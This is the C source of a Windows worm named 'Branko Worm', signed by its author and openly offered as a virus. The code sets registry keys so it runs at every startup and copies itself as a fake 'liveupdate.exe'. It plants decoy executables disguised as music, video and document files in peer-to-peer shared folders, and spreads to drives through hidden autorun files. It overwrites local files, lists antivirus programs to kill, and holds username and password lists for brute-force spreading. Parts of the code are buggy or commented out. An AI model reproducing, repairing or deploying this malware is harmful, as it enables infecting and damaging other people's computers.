/*================================================================
   Author : Undermine
   Virus Name: Branko Worm 
   http://undermine.bloger.hr
   Description:
      * Run at every startup
      * Infect drives & files
      * P2P Process
      * Taskkill av
Attempt to spread using predefined users/password list.
great thanks :  Lim Ci,  Mar'i, Kevin and "Maja for everything".
==================================================================*/
 #include <windows.h>
#define PORT 80
#define USERS_NUM 93
#define PWD_NUM 107
#define VirSize	(9989+1)
#define LenID	(7+1)

const char *Inf_Drives[] = {"A:","B:","C:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:","O:","P:",
"Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:",0};
const char *Taskkill[] = {"av","Av","AV","defend","Defend","DEFEND","f-","F-","defense","Defense","DEFENSE",
"Kaspersky","KASPERSKY","kaspersky","sophos","SOPHOS","Sophos","Scanner","SCANNER","scanner","Norton","norton",
"NORTON","Security","SECURITY","security","Anti","ANTI","anti","SCAN","Scan","scan","Malware","MALWARE","malware",
"Virus","VIRUS","virus","NOD32","nod32","Nod32","Zoner","ZONER","zoner","SECUR","Secur","secur","Dr.","DR.","DR.Web",0};
 
int InfectDrives(void);
int InfectFiles(void);
void FindDirectory(LPCSTR DirPath);
void FillArray(LPCSTR Directory);
 
char DirArray[250000][MAX_PATH];
int dircount = 0;
char windir[MAX_PATH];
HKEY hKey;
 
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 int count;
 char wormpath[256];
 GetWindowsDirectory(windir, sizeof(windir));
 HMODULE hMe = GetModuleHandle(NULL);
 DWORD nRet = GetModuleFileName(hMe, wormpath, 256);
 HKEY hKey;
 strcat(windir, "\\System32\\liveupdate.exe");
 CopyFile(wormpath, windir, 0);


 RegCreateKey (HKEY_CLASSES_ROOT, "CLSID\\{7A9D77BD-5403-11d2-8785-2E0420524153}", &hKey);
 RegSetValueEx (hKey, "Branko", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\InternetRegistry",&hKey);
 RegSetValueEx (hKey, "Branko", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\Remote",&hKey);
 RegSetValueEx (hKey, "Explorer", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
 RegSetValueEx (hKey, "Branko", 0, REG_SZ, (LPBYTE)windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Kazaa\\Transfer", &hKey);
 RegSetValueEx (hKey, "Upload", 0, REG_SZ, (LPBYTE)windir, sizeof(windir)); 
 // small reg-help worm coz fuckednod32 want elimination De5 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Protected Storage System Provider\\S-1-5-21-1004336348-484061587-1177238915-500\\NoAction", &hKey);
 RegSetValueEx (hKey, "Branko", 0, REG_SZ, (LPBYTE)windir, sizeof(windir)); 
 
 RegCreateKey (HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows Live\\Communications Clients\\Share", &hKey);
 RegSetValueEx (hKey, "Send", 0, REG_SZ, (LPBYTE)windir, sizeof(windir)); 

 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\gratis.mp3.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladygaga.mp3                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\maliciousremovaltool.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladyinbed.avi                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\ReadMe!.nfo                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\list-download.txt                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\game-collection.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\porno+18.mpeg                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\remoteotherkazaa.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\softpacked.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\LimeWire\\gratis.zip.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\LimeWire\\My Shared Folder\\spaceticket.doc                    .exe", 0);
 CopyFile(wormpath, "C:\\WINDOWS\\system32\\inetsrv.dll                    .exe", 0);
 {
     count = count ^ 5;
 }
 return 0;
}
int NeverAntiVirus(void)
{
	int c;
	while(1) {
		for(c=0;Taskkill[c]!=0;c++) system((char *)&Taskkill[c]);
		Sleep(1000);
	}
	return 0;
}
int InfectDrives(void)
{
	char IFile[256], NewFile[256], Autorun[256], InfFile[256];
	GetSystemDirectory(IFile,sizeof(IFile));
	strcat(IFile,"\\updater.exe");
	int i;
	while(1) {
		for(i = 0; Inf_Drives[i]; i++) {
			memset(NewFile,'\0',sizeof(NewFile));
			memset(Autorun,'\0',sizeof(Autorun));
			memset(InfFile,'\0',sizeof(InfFile));
			strcpy(NewFile,Inf_Drives[i]);
			strcpy(Autorun,Inf_Drives[i]);
			strcat(NewFile,"\\allow.exe");
			strcat(Autorun,"\\autorun.inf");
			if(CopyFile(IFile,NewFile,FALSE)) {
			//	FILE *runfile = fopen(Autorun,"wb");
		    	sprintf(InfFile,"[autorun]\r\nopen=allow.exe\r\naction=Open folder to view files\r\n");
			//	fputs(InfFile,runfile);
			//	fclose(runfile);
				SetFileAttributes(NewFile,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
				SetFileAttributes(Autorun,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
			}
		}
		Sleep(2000);
	}
}
int InfectFiles(void)
{
	WIN32_FIND_DATA w32;
	HANDLE fHandle;
	char MyFile[256];
	GetModuleFileName(NULL,MyFile,sizeof(MyFile));
	if((fHandle = FindFirstFile("*.*",&w32))==INVALID_HANDLE_VALUE) return 1;
	else {
		if(w32.cFileName==MyFile) goto next;
		SetFileAttributes(w32.cFileName,FILE_ATTRIBUTE_NORMAL);
		CopyFile(MyFile,w32.cFileName,FALSE);
        next:
		while(FindNextFile(fHandle,&w32)) {
			if(w32.cFileName==MyFile) continue;
			SetFileAttributes(w32.cFileName,FILE_ATTRIBUTE_NORMAL);
			CopyFile(MyFile,w32.cFileName,FALSE);
		}
		FindClose(fHandle);
	}
	return 0;
}
void FindDirectory(LPCSTR DirPath)
{
     WIN32_FIND_DATA FindData;
     HANDLE hFind;
     char Path[MAX_PATH];
     hFind = FindFirstFile(DirPath, &FindData);
     do
     {
         strcpy(Path, DirPath);
         Path[strlen(DirPath)-1] = 0;
         strcat(Path, FindData.cFileName);

         if ((FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY || FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM) && (strstr(FindData.cFileName,".")==0))
         {
           FillArray(Path);
           strcat(Path,"\\*");
           FindDirectory(Path);
         }

     } while (FindNextFile(hFind,&FindData));
     FindClose(hFind);
}

void FillArray(LPCSTR Directory)
{
     lstrcpy(DirArray[dircount],Directory);
     dircount++;
} //payload with other worm family called hunatcha 
void Payload(void)
{
	char wormpath[MAX_PATH];
	GetModuleFileName(NULL, wormpath, MAX_PATH);
	strcat(windir, "\\System32\\liveupdate.exe");
	MessageBox (0, "Your system need to update my new world...", "Hunatcha Informer", MB_ICONINFORMATION | MB_OK);
}
/*
void doagain(void)
{

	current_time = time (0);
		// seed random number generator (again) 
	srand48(current_time);
		// attack gateways, local nets, remote nets 
	attack_hosts();
		// check for a "listening" worm 
	check_other ()
		// attempt to send byte to "branko" 
	users_list ()
	for (;;) {
		// crack password list 
	password_list ();
		// sleep or listen for other worms 
	other_sleep (30);
	login ();
		// switch process id's 
		if (fork())
			// parent exits, new worm continues 
			exit (0);
		// attack gateways, known hosts 
		attack_hosts();
		other_sleep(120);
			// if 12 hours have passed, reset hosts 
		if(time (0) == current_time + (3600*12)) {
			reset_hosts();
			current_time = time(0); }
			// quit if pleasequit is set, and nextw>10 
		if (pleasequit && nextw > 10)
			exit (0);
	}
}

*/
static char *users_list[] = {
	NULL,
	"admin","administrator","antrax","bob","guest",
	"root","test","plantaspont","wwwadmin","ucoz","milan",
	"forum","sindikat","camel","business","enter","muhamad",
	"lord","cetnik","princo","skynet","workshop","airport","batamb",	
	"deniz","foundation","nathan","alpha","neobux","hill","student",
	"micrology","avers","developer","jecka","hoffman","melita","byter",
	"zen","eindhoven","gecko","alpha","client","server","ufonet",
	"welcome","cetnik","ncsc","jenna","gaga","melita","beta",
	"deniz","pantera","nathan","clients1","mupek","hosts","orion",
	"welcome","pcworld","pajov","sunos","homer","melita","beta",
	"deniz","netware","zokili","beonet","mup","mpek","ultimate",
	"ladygaga","network","melissa","ana","clients0","telenor",
	"gamer","matrix","anna","public","documents","devil",
	"nicktoons","jimmy","spongebob","eunet","users"
	"webmaster","default"
};
static char *passwords_list[] = {
	 NULL,
	 "qwerty","veki","123","1234","12345","123456",
	 "1234567","12345678","123456789","1234567890",
	 "access","Orion","bob","billy","vesna","dejan",
	 "internet","bitch","data","database","home", 
	 "server","login","guest","lucy","pass","pass1234",
	 "jenna","intruder","macro","enter","djindjic",
     "winpass","root","weber","user","test","gamer",
	 "lazar","skorpija","sex","sexy","oracle","mysql",
	 "061279","dekd5emgfa","evropa","hell","bloger",
	 "internet","boss","hacker","system","2012",
	 "fishbowl","zokili","shadow","index","abcd",
	 "123abc","qweerty","joker","euroserbia","euronet",
	 "milan","abcde","testing","start","space",
	 "bgzemun","bgzpodzemlje","fsarah","271076nenalaki",
	 "ljubaviska","sneza1969","12071948","vekibg87",
	 "h27dklsu","mitrijevic","uyd23j08jhw","j923hq0",
	 "azxcvbmn","geniusnet","vaga65","sundjerbob",
	 "macrobg","password","korisnik","difcult198j0",
	 "usercard","jwfi82vz9","capscope","usernet",
	 "tywerq","epadnote","springers","dominosex",
     "aradonjic","summernight","worlddate","night",
	 "masterds","wlive","borntuesday","exister",
	 "carlosmontana","patrijarhija"
};

/* default login form */
static char *login = "";